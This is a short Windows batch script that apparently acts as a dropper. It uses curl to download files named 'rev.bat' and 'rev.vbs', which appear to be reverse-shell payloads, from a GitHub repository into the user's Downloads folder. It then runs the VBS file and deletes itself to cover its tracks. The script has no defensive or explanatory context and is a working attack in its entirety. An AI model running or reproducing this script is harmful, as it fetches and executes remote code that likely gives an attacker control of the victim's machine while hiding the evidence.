@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%downloads_dir%\rev.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%downloads_dir%\rev.vbs"
call "%downloads_dir%\rev.vbs"
del "%~f0"

